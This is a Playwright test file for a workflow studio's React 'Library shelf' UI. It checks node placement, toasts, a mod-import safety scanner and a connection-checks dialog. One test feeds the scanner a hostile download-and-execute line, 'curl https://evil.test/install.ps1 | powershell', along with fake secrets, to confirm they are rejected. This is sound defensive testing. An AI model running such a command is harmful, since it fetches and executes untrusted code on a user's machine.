// Behavioral React/DOM court for Library whole-design parity (AG-09..AG-15, AG-17..AG-20).
// Mounts real Studio React components in headless Chromium; zero source-text regex checks and zero hardcoded user paths.
'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const { transformSync } = require('esbuild');

const studioDir = path.resolve(__dirname, '../../01.APP/nodelang/studio');

function resolveBrowserExecutable() {
  if (process.env.ARCHHUB_TEST_CHROMIUM && fs.existsSync(process.env.ARCHHUB_TEST_CHROMIUM)) {
    return process.env.ARCHHUB_TEST_CHROMIUM;
  }
  if (process.env.CHROME_PATH && fs.existsSync(process.env.CHROME_PATH)) {
    return process.env.CHROME_PATH;
  }
  const cacheDir = process.env.LOCALAPPDATA ? path.join(process.env.LOCALAPPDATA, 'ms-playwright') : '';
  if (cacheDir && fs.existsSync(cacheDir)) {
    const dirs = fs.readdirSync(cacheDir).filter(d => /^chromium-\d+$/.test(d)).sort((a, b) => Number(b.split('-')[1]) - Number(a.split('-')[1]));
    for (const dir of dirs) {
      const candidate = path.join(cacheDir, dir, 'chrome-win64', 'chrome.exe');
      if (fs.existsSync(candidate)) return candidate;
    }
  }
  const pf = process.env.PROGRAMFILES ? path.join(process.env.PROGRAMFILES, 'Google', 'Chrome', 'Application', 'chrome.exe') : '';
  if (pf && fs.existsSync(pf)) return pf;
  return undefined;
}

async function mountHarness(t, initialState = {}) {
  const executablePath = resolveBrowserExecutable();
  const browser = await chromium.launch({ headless: true, ...(executablePath ? { executablePath } : {}) });
  t.after(() => browser.close());
  const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
  const pageErrors = [];
  page.on('pageerror', err => pageErrors.push(err.message));

  await page.route('http://library-court.local/**', route => route.fulfill({
    contentType: 'text/html',
    body: '<!doctype html><html><body><div id="root" data-screen="canvas" style="display:flex;height:100vh"></div></body></html>'
  }));
  await page.goto('http://library-court.local/');
  await page.addStyleTag({ path: path.join(studioDir, 'style.css') });

  for (const rel of ['vendor/react.js', 'vendor/react-dom.js']) {
    await page.addScriptTag({ content: fs.readFileSync(path.join(studioDir, rel), 'utf8') });
  }

  await page.evaluate(seed => {
    const listeners = new Set();
    let state = {
      revision: 1,
      libraryStatus: 'loaded',
      libraryCollapsed: [],
      libraryTree: [
        { id: 'host', label: 'Programs', icon: 'canvas', categories: ['host', 'connectors', 'office'] },
        { id: 'file', label: 'Files', icon: 'folder', categories: ['file', 'files'] },
        { id: 'skill', label: 'Workflows and skills', icon: 'group', categories: ['skill'] },
        { id: 'trigger', label: 'Starts a run', icon: 'clock', categories: ['trigger'] },
        { id: 'governance', label: 'Checks and standards', icon: 'check', categories: ['governance', 'enforce'] },
        { id: 'settings', label: 'Settings', icon: 'settings', categories: ['settings'] }
      ],
      catalogue: [],
      libraryPorts: [],
      templates: [],
      graphs: [],
      tasks: [],
      hosts: [],
      mods: [],
      mcpServers: [],
      suggestions: [],
      settings: [
        { id: 'Appearance.Theme', page: 'Appearance', label: 'Theme', type: 'enum', value: 'Dark', default: 'Dark', options: ['Dark', 'Light'] },
        { id: 'Projects.Units', page: 'Projects', label: 'Length unit', type: 'choice', value: 'mm', default: 'mm', options: ['mm', 'm'] }
      ],
      sessionFile: '/sessions/open-now.archhub',
      graph: { id: 'g1', name: 'Active graph', nodes: [], wires: [] },
      ...seed
    };

    window.recorded = {
      added: [],
      exposedSettings: [],
      createdTasks: [],
      openedTasks: [],
      routes: [],
      modals: [],
      toasts: [],
      selectedNodeIds: [],
      collapsed: 0,
      fitted: 0,
      drafts: {}
    };

    const publish = patch => {
      state = { ...state, ...patch, revision: state.revision + 1 };
      listeners.forEach(fn => fn());
    };
    window.__setState = publish;
    window.__getState = () => state;

    window.ArchHubAPI = {
      ready: Promise.resolve(state),
      subscribe: fn => { listeners.add(fn); return () => listeners.delete(fn); },
      getSnapshot: () => state,
      sessionPathKey: p => String(p || '').replace(/\\/g, '/').toLowerCase(),
      getSessionPath: () => state.sessionFile || '',
      getSessionDocument: () => ({ id: state.graph.id, properties: {} }),
      supportsAction: () => true,
      setLibraryCollapsed: async groups => { publish({ libraryCollapsed: groups }); return { ok: true }; },
      readSessionListFilters: async () => ({ sessionListFilters: { home: 'all' } }),
      setSessionListFilter: async () => ({ ok: true }),
      addNode: async id => {
        window.recorded.added.push(id);
        const made = { id: 'placed:' + id, title: id };
        return made;
      },
      insertSession: async sessionPath => {
        window.recorded.added.push('session:' + sessionPath);
        return { id: 'placed-sess:' + sessionPath };
      },
      exposeSettingsPage: async pageName => {
        window.recorded.exposedSettings.push(pageName);
        return { id: 'setting-node:' + pageName, page: pageName };
      },
      createTask: async title => {
        const tid = 'task-' + (window.recorded.createdTasks.length + 1);
        window.recorded.createdTasks.push({ id: tid, title });
        return { ok: true, taskId: tid, id: tid };
      },
      openTaskGraph: async tid => {
        window.recorded.openedTasks.push(tid);
        return { ok: true };
      },
      listTasks: async () => state.tasks,
      refreshMods: async () => state.mods,
      inspectMod: async () => state.nextInspectedMod || null,
      installMod: async id => {
        window.recorded.installedMod = id;
        return { id, status: 'Installed' };
      },
      setModEnabled: async () => ({ ok: true }),
      removeMod: async () => ({ ok: true })
    };
  }, initialState);

  for (const rel of ['tokens.jsx', 'ds/index.jsx', 'icons.jsx', 'ui.jsx']) {
    const code = transformSync(fs.readFileSync(path.join(studioDir, rel), 'utf8'), { loader: 'jsx' }).code;
    await page.addScriptTag({ content: code });
  }

  await page.evaluate(() => {
    window.__route = 'canvas';
    const appStub = () => ({
      route: window.__route,
      task: 't-active',
      modal: null,
      composerDraft: window.recorded.drafts,
      setComposerDraft: updater => {
        window.recorded.drafts = typeof updater === 'function' ? updater(window.recorded.drafts) : updater;
      },
      act: async fn => await fn(),
      setSelectedNodeId: id => { window.recorded.selectedNodeIds.push(id); },
      setTask: id => { window.recorded.activeTask = id; },
      openTaskFile: id => { window.recorded.openedTaskFiles = [...(window.recorded.openedTaskFiles || []), id]; },
      go: (r, arg) => { window.recorded.routes.push([r, arg]); },
      show: (k, data) => { window.recorded.modals.push([k, data]); },
      close: () => { window.recorded.closedModal = (window.recorded.closedModal || 0) + 1; },
      setToast: msg => { window.recorded.toasts.push(msg); }
    });
    window.UI.useApp = appStub;
    window.UI.useAction = () => ({
      state: 'loaded',
      error: '',
      run: async fn => (fn ? await fn() : null),
      retry: () => {}
    });
    window.UI.requestCanvasFit = () => { window.recorded.fitted += 1; };
    const origIcon = window.AHIcon;
    window.AHIcon = props => window.React.createElement('span', { 'data-icon-name': props.name, 'data-icon-size': props.size }, origIcon(props));
  });

  for (const rel of ['integration-states.jsx', 'ds_library.jsx']) {
    const code = transformSync(fs.readFileSync(path.join(studioDir, rel), 'utf8'), { loader: 'jsx' }).code;
    await page.addScriptTag({ content: code });
  }

  t.after(() => assert.deepEqual(pageErrors, [], 'zero runtime page errors'));
  return page;
}

test('AG-09..AG-14 & AG-20: LibraryShelf header, PROGS_G sub-headings, Settings nodes, workflows, .off toasts, .libprev and placement', async t => {
  const page = await mountHarness(t, {
    hosts: [
      { id: 'revit', name: 'Revit', state: 'connected' },
      { id: 'rhino', name: 'Rhino', state: 'absent' }
    ],
    mods: [
      { id: 'revit-tools', name: 'Revit tools', enabled: false, status: 'Disabled', nodes: [{ id: 'renum', title: 'Renumber views', category: 'host', summary: 'Renumber views' }] }
    ],
    graphs: [
      { id: 'wf-open', path: '/sessions/open-now.archhub', title: 'Open workflow', kind: 'workflow', state: 'active', nodes: [{}, {}] },
      { id: 'wf-arch', path: '/sessions/old-archived.archhub', title: 'Archived workflow', kind: 'workflow', state: 'archived', nodes: [{}] },
      { id: 'wf-saved', path: '/sessions/door-pipeline.archhub', title: 'Office details pipeline', kind: 'workflow', state: 'active', nodes: [{}, {}, {}] }
    ],
    templates: [
      { id: 'skill:agent-chat', kind: 'agent-session', title: 'Claude chat' }
    ],
    catalogue: [
      { id: 'revit_open', name: 'Open model', family: 'host', description: 'Open Revit model', descriptor: { engine: 'revit.open' } },
      { id: 'revit_write', name: 'Create sheets', family: 'host', description: 'Create Revit sheets after approval', descriptor: { engine: 'revit.create_sheets' } },
      { id: 'acad_dwg', name: 'Convert DWG to data', family: 'host', description: 'Read AutoCAD DWG', descriptor: { engine: 'acad.read' } },
      { id: 'xl_read', name: 'Excel read range', family: 'host', description: 'Read Excel workbook', descriptor: { engine: 'office.read' } },
      { id: 'out_mail', name: 'Read inbox', family: 'host', description: 'Read Outlook inbox', descriptor: { engine: 'outlook.inbox' } },
      { id: 'max_render', name: 'Render 3ds Max view', family: 'host', description: 'Render in 3ds Max', descriptor: { engine: 'max.exec' } },
      { id: 'rhino_bake', name: 'Bake Rhino geometry', family: 'host', description: 'Bake in Rhino', descriptor: { engine: 'rhino.exec' } },
      { id: 'blender_render', name: 'Render Blender scene', family: 'host', description: 'Render in Blender', descriptor: { engine: 'blender.exec' } },
      { id: 'notion_search', name: 'Notion search', family: 'connectors', description: 'Search Notion workspace', descriptor: { engine: 'notion.search' } },
      { id: 'file_read', name: 'Read file', family: 'file', description: 'Read CSV rows', descriptor: { engine: 'file.read' } },
      { id: 'remote_tunnel', name: 'Remote tunnel', family: 'trigger', description: 'Reach this session from outside this PC', unavailable: true, reason: 'Remote relay is disabled by policy.', descriptor: { engine: 'remote.tunnel' } },
      { id: 'skill:wf-open', name: 'Open workflow', family: 'skill', description: 'Session · 2 nodes', descriptor: { engine: 'skill' } },
      { id: 'skill:wf-arch', name: 'Archived workflow', family: 'skill', description: 'Session · 1 nodes', descriptor: { engine: 'skill' } },
      { id: 'skill:wf-saved', name: 'Office details pipeline', family: 'skill', description: 'Session · 3 nodes', descriptor: { engine: 'skill' } },
      { id: 'skill:agent-chat', name: 'Claude chat', family: 'skill', description: 'Session · 1 nodes', descriptor: { engine: 'skill' } }
    ],
    libraryPorts: [
      { id: 'revit_open', title: 'Open model', engine: 'revit.open', pure: true, params: { file: 'model.rvt' }, paramDefs: [{ id: 'file', name: 'File', type: 'file' }], ports: { target: [{ id: 'task', name: 'task', type: 'event' }, { id: 'file', type: 'file' }], source: [{ id: 'model', name: 'model', type: 'elements', cardinality: 'one' }] } },
      { id: 'revit_write', title: 'Create sheets', engine: 'revit.create_sheets', pure: false, params: { scale: '1:5' }, paramDefs: [{ id: 'scale', name: 'Scale', type: 'enum' }], ports: { target: [{ id: 'rows', name: 'rows', type: 'elements', cardinality: 'many' }, { id: 'scale', type: 'string' }], source: [{ id: 'sheets', name: 'sheets', type: 'elements', cardinality: 'many' }] } },
      { id: 'acad_dwg', title: 'Convert DWG to data', engine: 'acad.read', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'xl_read', title: 'Excel read range', engine: 'office.read', pure: true, params: { operation: 'excel.list_workbooks' }, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'out_mail', title: 'Read inbox', engine: 'outlook.inbox', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'max_render', title: 'Render 3ds Max view', engine: 'max.exec', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'rhino_bake', title: 'Bake Rhino geometry', engine: 'rhino.exec', pure: false, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'blender_render', title: 'Render Blender scene', engine: 'blender.exec', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'notion_search', title: 'Notion search', engine: 'notion.search', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'file_read', title: 'Read file', engine: 'file.read', pure: true, params: {}, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'remote_tunnel', title: 'Remote tunnel', engine: 'remote.tunnel', available: false, noEngine: true, pure: false, params: {}, paramDefs: [], ports: { target: [{ id: 'policy', name: 'policy', type: 'string' }], source: [{ id: 'fire', name: 'fire', type: 'event' }] } },
      { id: 'skill:wf-open', title: 'Open workflow', engine: 'skill', pure: true, params: { session_file: '/sessions/open-now.archhub' }, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'skill:wf-arch', title: 'Archived workflow', engine: 'skill', pure: true, params: { session_file: '/sessions/old-archived.archhub' }, paramDefs: [], ports: { target: [], source: [] } },
      { id: 'skill:wf-saved', title: 'Office details pipeline', engine: 'skill', pure: true, params: { session_file: '/sessions/door-pipeline.archhub' }, paramDefs: [], ports: { target: [], source: [] } }
    ]
  });

  await page.evaluate(() => {
    window.ReactDOM.render(
      window.React.createElement(window.UI.LibraryShelf, { onClose: () => { window.recorded.collapsed += 1; } }),
      document.getElementById('root')
    );
  });

  const shelf = page.getByRole('complementary', { name: 'Library shelf', exact: true });
  await shelf.waitFor();

  // AG-20: CheckProblems is deleted.
  assert.equal(await page.evaluate(() => typeof window.UI.CheckProblems), 'undefined');

  // AG-09: Header has Tab hint + Collapse library back button; no × close button, no New canvas session button, no family-chips.
  assert.equal(await shelf.locator('.kb').textContent(), 'Tab');
  const collapseBtn = shelf.getByRole('button', { name: 'Collapse library', exact: true });
  assert.equal(await collapseBtn.locator('[data-icon-name="back"]').count(), 1);
  assert.equal(await shelf.getByRole('button', { name: 'Close Library', exact: true }).count(), 0);
  assert.equal(await shelf.locator('.shelf-new-session').count(), 0);
  await collapseBtn.click();
  assert.equal(await page.evaluate(() => window.recorded.collapsed), 1);

  // AG-10: Programs renders PROGS_G sub-headings in canonical order.
  assert.deepEqual(
    await shelf.locator('[data-library-category="host"] .libsub').allTextContents(),
    ['Revit', 'AutoCAD', 'Excel', 'Outlook', '3ds Max', 'Rhino', 'Blender']
  );

  // AG-12: Zero UI.Soon wrappers; every row has .tile.fam-* + 12px icon + plainSrc subtitle.
  assert.equal(await shelf.locator('[data-soon]').count(), 0);
  const openModelRow = shelf.locator('[data-lib="revit_open"]');
  assert.equal(await openModelRow.locator('.tile.fam-model [data-icon-size="12"]').count(), 1);
  assert.equal(await openModelRow.locator('em').textContent(), 'Runs in Revit');

  const createSheetsRow = shelf.locator('[data-lib="revit_write"]');
  assert.equal(await createSheetsRow.locator('.tile.fam-effect').count(), 1);
  assert.equal(await createSheetsRow.locator('em').textContent(), 'Runs in Revit · waits for your Approve');

  assert.equal(await shelf.locator('[data-lib="file_read"] em').textContent(), 'Built into ArchHub');
  assert.equal(await shelf.locator('[data-lib="notion_search"] em').textContent(), 'Through your Notion');

  // AG-12: Disabled/disconnected/unavailable rows have .off + aria-disabled="true", are NOT HTML disabled, and clicking fires toast "{name}: {whyOff}".
  for (const selector of ['[data-lib="remote_tunnel"]', '[data-lib="rhino_bake"]', '[data-lib="mod:revit-tools:renum"]']) {
    const row = shelf.locator(selector);
    assert.equal(await row.evaluate(el => el.classList.contains('off') && el.getAttribute('aria-disabled') === 'true' && !el.disabled), true, selector + ' is .off with aria-disabled and clickable');
    await row.click({ force: true });
  }
  const offToasts = await page.evaluate(() => window.recorded.toasts.splice(0));
  assert.equal(offToasts.length, 3);
  assert.match(offToasts[0], /^Remote tunnel: Remote relay is disabled by policy\./);
  assert.match(offToasts[1], /^Bake Rhino geometry: Rhino is not connected on this PC\./);
  assert.match(offToasts[2], /^Renumber views: From the Revit tools mod, which is off\./);
  assert.deepEqual(await page.evaluate(() => window.recorded.added), []);

  // AG-11: Saved workflows exclude open & archived sessions and render single .libi.sessi row; single click drops as one node.
  const skillSection = shelf.locator('[data-library-category="skill"]');
  assert.equal(await skillSection.locator('.libi.sessi').count(), 1);
  const savedRow = skillSection.locator('.libi.sessi');
  assert.equal(await savedRow.locator('b').textContent(), 'Office details pipeline');
  assert.equal(await savedRow.locator('em').textContent(), 'Your workflow · 3 steps · drops in as one node');
  await savedRow.click();
  assert.deepEqual(await page.evaluate(() => window.recorded.added.splice(0)), ['skill:wf-saved']);

  // AG-10: Settings category renders Settings area items placing corresponding Settings area node via exposeSettingsPage.
  const projectsSetRow = shelf.locator('[data-library-category="settings"] [data-sput="Projects"]');
  await projectsSetRow.click();
  assert.deepEqual(await page.evaluate(() => window.recorded.exposedSettings), ['Projects']);

  // AG-13: Hover/focus .libprev shows title, source, typed sockets, parameter names + types, and disabled hint.
  await createSheetsRow.hover();
  const prevText = await shelf.locator('.libprev').textContent();
  assert.ok(prevText.includes('Create sheets'));
  assert.ok(prevText.includes('Runs in Revit · waits for your Approve'));
  assert.ok(prevText.includes('rows · Elements list · in'));
  assert.ok(prevText.includes('sheets · Elements list · out'));
  assert.ok(prevText.includes('Scale'));
  assert.ok(prevText.includes('choice'));
  assert.equal(await shelf.locator('.libprev i.sk.t-elements.l').count(), 2);

  await shelf.locator('[data-lib="mod:revit-tools:renum"]').focus();
  assert.ok((await shelf.locator('.libprev').textContent()).includes('This mod is disabled. Enable it in Settings › Nodes.'));

  // AG-09: Search shows no .family-chips; Enter in #libq skips .off rows and places first enabled match.
  await page.evaluate(() => { window.recorded.toasts.length = 0; window.recorded.selectedNodeIds.length = 0; });
  const search = shelf.locator('#libq');
  await search.fill('remote');
  assert.equal(await shelf.locator('.family-chips').count(), 0);
  await search.press('Enter');
  assert.deepEqual(await page.evaluate(() => window.recorded.added), [], 'Enter skips .off match');

  await search.fill('Open model');
  await search.press('Enter');
  // AG-14: Canvas placement selects node and toasts "{name} added. Drag from its sockets to wire it."
  const canvasPlacement = await page.evaluate(() => ({
    added: window.recorded.added.splice(0),
    selected: window.recorded.selectedNodeIds.splice(0),
    toasts: window.recorded.toasts.splice(0)
  }));
  assert.deepEqual(canvasPlacement.added, ['revit_open']);
  assert.deepEqual(canvasPlacement.selected, ['placed:revit_open']);
  assert.deepEqual(canvasPlacement.toasts, ['Open model added. Drag from its sockets to wire it.']);

  // AG-14: Home click creates new session with node as first step and toasts with Open action.
  await page.evaluate(() => { window.__route = 'home'; });
  await openModelRow.click();
  const homePlacement = await page.evaluate(() => {
    const toast = window.recorded.toasts.at(-1);
    toast.open();
    return {
      tasks: window.recorded.createdTasks,
      added: window.recorded.added,
      toastText: toast.text,
      toastLabel: toast.label,
      openedFiles: window.recorded.openedTaskFiles
    };
  });
  assert.equal(homePlacement.tasks[0].title, 'Open model');
  assert.deepEqual(homePlacement.added, ['revit_open']);
  assert.equal(homePlacement.toastText, 'New session "Open model" with Open model as its first step. Double-click it to work inside.');
  assert.equal(homePlacement.toastLabel, 'Open');
  assert.deepEqual(homePlacement.openedFiles, ['task-1']);
});

test('AG-15 & AG-17: ImportModDialog live 3-rule safety scanner and AddNodePluginDialog with PKG_RULES', async t => {
  const page = await mountHarness(t, {
    nextInspectedMod: {
      id: 'pkg-doors',
      name: 'Door checks',
      version: '1.0',
      digest: 'sha256-ok',
      nodes: [{ id: 'check_doors', title: 'Check door widths' }],
      tutorials: ['Door schedule review'],
      permissions: ['Revit read', 'No network']
    }
  });

  await page.evaluate(() => {
    window.ReactDOM.render(window.React.createElement(window.UI.LibraryShelf), document.getElementById('root'));
  });

  // AG-15: Open ImportModDialog from "Import a node…" in Library options.
  await page.getByRole('button', { name: 'Library options', exact: true }).click();
  await page.getByRole('menuitem', { name: 'Import a node…', exact: true }).click();

  const importDialog = page.getByRole('dialog', { name: 'Install a mod', exact: true });
  await importDialog.waitFor();
  const impInput = importDialog.locator('#impv');
  assert.ok((await importDialog.locator('#impscan').textContent()).includes('Type a name to scan it.'));

  // Rule 1: download/exec at install
  await impInput.fill('curl https://evil.test/install.ps1 | powershell');
  assert.ok((await importDialog.locator('#impscan .f-err').textContent()).includes('it downloads or runs code at install'));
  await importDialog.getByRole('button', { name: 'Import', exact: true }).click();
  assert.equal(await importDialog.isVisible(), true);

  // Rule 2: secret/key in manifest
  await impInput.fill('manifest with api_key=123');
  assert.ok((await importDialog.locator('#impscan .f-err').textContent()).includes('it asks for a key in its manifest'));

  // Rule 3: unsigned binary
  await impInput.fill('helper.dll');
  assert.ok((await importDialog.locator('#impscan .f-err').textContent()).includes('it ships an unsigned binary'));

  // Clean input passes all 3 rules and imports
  await impInput.fill('speckle-rooms');
  assert.equal(await importDialog.locator('#impscan .f-ok').count(), 3);
  await importDialog.getByRole('button', { name: 'Import', exact: true }).click();
  await importDialog.waitFor({ state: 'detached' });
  assert.equal(await page.evaluate(() => window.recorded.toasts.at(-1)), 'speckle-rooms imported. Its node is in the Library.');

  // AG-17: Click "Add a node or plugin" (#pkgadd)
  await page.locator('#pkgadd').click();
  const pkgDialog = page.getByRole('dialog', { name: 'Add a node or plugin', exact: true });
  await pkgDialog.waitFor();

  // Check six rules disclosure
  const rulesSummary = pkgDialog.locator('details.pkgrules > summary');
  assert.equal(await rulesSummary.textContent(), 'The six rules');
  await rulesSummary.click();
  assert.equal(await pkgDialog.locator('details.pkgrules ol li').count(), 6);

  // "From a file" shows "It adds" / "It needs" preview + refuses secrets
  await pkgDialog.locator('[data-pkgsrc="file"]').click();
  const installDialog = page.getByRole('dialog');
  assert.ok((await installDialog.textContent()).includes('It adds'));
  assert.ok((await installDialog.textContent()).includes('Check door widths'));
  assert.ok((await installDialog.textContent()).includes('It needs'));
  assert.ok((await installDialog.textContent()).includes('Revit read'));

  await installDialog.locator('#pkgfile-input').fill('{"secret":"sk-123"}');
  assert.ok((await installDialog.locator('[role="alert"]').textContent()).includes('Refused'));
  await installDialog.locator('#pkgfile-input').fill('');
  await installDialog.getByRole('button', { name: 'Install', exact: true }).click();
  await installDialog.waitFor({ state: 'detached' });

  // "Ask an agent to build one" pre-fills composer draft
  await page.locator('#pkgadd').click();
  await page.locator('[data-pkgsrc="agent"]').click();
  const drafts = await page.evaluate(() => Object.values(window.recorded.drafts).map(d => d.text));
  assert.deepEqual(drafts, ['Build a node that ']);
});

test('AG-19: ConnectionChecksDialog reports type/list mismatch, missing input, unused output, and selects & fits clicked node', async t => {
  const page = await mountHarness(t, {
    graph: {
      id: 'g-lint',
      name: 'Lint graph',
      nodes: [
        { id: 'fixed-session', type: 'thing.session', fixed: true, title: 'Session', inputs: [], outputs: [] },
        { id: 'trig1', type: 'trigger.schedule', trigger: true, pure: true, title: 'Morning schedule', inputs: [], outputs: [{ id: 'fire', name: 'fire', type: 'event' }] },
        { id: 'step1', type: 'revit.open', pure: true, title: 'Open model', inputs: [{ id: 'task', name: 'task', type: 'event' }], outputs: [{ id: 'model', name: 'model', type: 'elements', list: false }] },
        { id: 'step2', type: 'revit.sheets', pure: false, effect: true, title: 'Make sheets', inputs: [{ id: 'views', name: 'views', type: 'file', list: true }], outputs: [{ id: 'sheets', name: 'sheets', type: 'elements', list: true }] },
        { id: 'orphan1', type: 'shape.filter', pure: true, title: 'Filter doors', inputs: [{ id: 'in', name: 'in', type: 'elements', list: true }], outputs: [{ id: 'out', name: 'out', type: 'elements', list: true }] }
      ],
      wires: [
        { id: 'w1', from: 'trig1', fromPort: 'fire', to: 'step1', toPort: 'task', enabled: true },
        { id: 'w2', from: 'step1', fromPort: 'model', to: 'step2', toPort: 'views', enabled: true }
      ]
    }
  });

  await page.evaluate(() => {
    window.ReactDOM.render(
      window.React.createElement(window.UI.ConnectionChecksDialog, { onClose: () => { window.recorded.lintClosed = true; } }),
      document.getElementById('root')
    );
  });

  const dialog = page.getByRole('dialog', { name: 'Connection checks', exact: true });
  await dialog.waitFor();
  assert.ok((await dialog.locator('.dsub').textContent()).includes('2 wires and 4 nodes checked. 3 to look at.'));

  const rows = await dialog.locator('.drow.lint').evaluateAll(els => els.map(el => ({
    cls: el.querySelector('span').className,
    text: el.querySelectorAll('span')[1].textContent
  })));
  assert.deepEqual(rows, [
    { cls: 'f-err', text: 'Type mismatch: Open model.model into Make sheets.views' },
    { cls: 'f-warn', text: 'Filter doors gets no input, so it never runs' },
    { cls: 'f-warn', text: 'Filter doors feeds nothing; its result is not used' }
  ]);

  // Clicking a finding selects & fits that node and closes the dialog.
  await dialog.locator('[data-lint="1"]').click();
  const picked = await page.evaluate(() => ({
    selected: window.recorded.selectedNodeIds,
    centred: window.UI.centreWhenShown,
    fitted: window.recorded.fitted,
    closed: window.recorded.lintClosed
  }));
  assert.deepEqual(picked.selected, ['orphan1']);
  assert.equal(picked.centred.nodeId, 'orphan1');
  assert.equal(picked.fitted, 1);
  assert.equal(picked.closed, true);
});
